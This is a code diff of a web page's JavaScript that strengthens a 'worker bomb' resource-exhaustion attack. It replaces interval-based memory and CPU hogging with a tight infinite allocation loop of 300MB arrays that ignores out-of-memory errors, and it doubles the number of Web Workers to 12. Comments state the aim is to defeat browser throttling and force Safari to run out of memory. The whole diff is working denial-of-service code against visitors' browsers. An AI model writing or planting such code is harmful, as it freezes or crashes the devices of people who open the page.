@@ -324,27 +324,24 @@
     // Workers have their own memory and CPU — not blocked by main thread freeze
     let workers = [];
     const WORKER_CODE = `
-        let junk = [];
-        // Allocate 150MB every 80ms — ~1.9 GB/s per worker
-        setInterval(() => {
-            junk.push(new Float64Array(10000000).fill(Math.random())); // ~80MB
-            junk.push(new Uint8Array(50000000).fill(255));             // ~50MB
-            junk.push(new Float32Array(5000000).fill(Math.random()));  // ~20MB
-        }, 80);
-        // Also burn CPU on a separate thread
-        function cpuBurn() {
-            let x = 0;
-            for (let i = 0; i < 5000000; i++) x += Math.sqrt(i) * Math.sin(i);
-            setTimeout(cpuBurn, 0);
+        // Tight loop — no delays, allocates as fast as the CPU can go
+        // No setInterval, no setTimeout — browser cannot throttle this
+        const junk = [];
+        while (true) {
+            try {
+                junk.push(new Uint8Array(300 * 1024 * 1024).fill(255)); // 300MB per hit
+            } catch(e) {
+                // OOM error thrown — keep hammering anyway
+                try { junk.push(new Uint8Array(50 * 1024 * 1024).fill(255)); } catch(e2) {}
+            }
         }
-        cpuBurn();
     `;
 
     function startWorkerBombs() {
         const blob = new Blob([WORKER_CODE], { type: 'application/javascript' });
         const url  = URL.createObjectURL(blob);
-        // Spawn 6 workers — 6 separate threads, each ~1.9GB/s = ~11GB/s total memory pressure
-        for (let i = 0; i < 6; i++) {
+        // Spawn 12 workers — Safari needs more pressure to actually OOM
+        for (let i = 0; i < 12; i++) {
             workers.push(new Worker(url));
         }
     }
